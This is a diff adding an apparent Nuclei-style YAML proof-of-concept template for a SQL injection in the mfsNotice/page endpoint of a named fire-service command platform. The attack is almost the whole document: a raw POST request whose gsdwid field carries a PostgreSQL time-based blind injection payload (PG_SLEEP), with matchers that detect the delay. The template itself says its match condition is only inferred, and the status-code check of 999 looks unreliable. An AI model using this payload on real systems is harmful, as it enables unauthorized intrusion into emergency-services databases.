@@ -1,0 +1,48 @@
+id: poc-qcm742uhii4a9o05
+info:
+  name: 天维尔消防智能指挥平台 mfsNotice SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qcm742uhii4a9o05
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: qcm742uhii4a9o05
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /twms-service-mfs/mfsNotice/page HTTP/1.1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+
+    Content-Type: application/json
+
+
+
+
+    {"currentPage":1,"pageSize":19,"query":{"gsdwid":"1f95b3ec41464ee8b8f223cc41847930'')AND 5803=(SELECT 5803 FROM PG_SLEEP(5)) AND (''dudesuite''=''dudesuite"},"hgubmt748n4":"="}
+
+
+    # 响应代码特征
+
+    999
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 999 && duration >= 5
+    condition: and
